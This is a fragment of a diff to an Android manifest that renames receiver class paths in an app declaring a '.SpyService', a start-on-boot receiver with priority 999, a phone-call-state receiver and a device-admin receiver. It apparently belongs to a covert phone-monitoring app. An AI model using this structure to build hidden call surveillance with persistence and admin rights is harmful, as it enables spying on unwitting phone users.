@@ -34,20 +34,20 @@
             android:name=".SpyService"
             android:exported="false" />
 
-        <receiver android:name=".observer.receiver.BootCompletedReceiver">
+        <receiver android:name=".receiver.BootCompletedReceiver">
             <intent-filter android:priority="999">
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
 
-        <receiver android:name=".observer.receiver.CallReceiver">
+        <receiver android:name=".control.call.CallReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
 
         <receiver
-            android:name=".observer.receiver.AdminReceiver"
+            android:name=".receiver.AdminReceiver"
             android:label="@string/app_name"
             android:permission="android.permission.BIND_DEVICE_ADMIN">
             <meta-data
